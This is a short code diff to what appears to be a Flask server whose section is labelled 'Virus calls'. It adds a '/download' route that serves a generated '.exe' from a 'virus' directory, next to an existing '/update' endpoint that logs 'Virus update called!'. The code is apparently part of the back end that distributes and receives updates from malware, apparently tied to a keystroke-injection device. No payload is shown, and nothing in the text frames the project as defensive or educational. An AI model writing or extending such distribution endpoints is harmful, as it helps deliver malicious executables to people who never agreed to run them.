@@ -144,6 +144,13 @@ def make_response(message, status_code=200):
 
 
 ###### Virus calls #######
+
+@app.route('/download')
+def download_exe():
+    exe_path = '/var/www/rubberduck/virus/generated_script.exe'  # Update with the actual path to your .exe file
+    return send_file(exe_path, as_attachment=True)
+
+
 @api.route('/update', methods=['POST'])
 def update():
     print("Virus update called!")
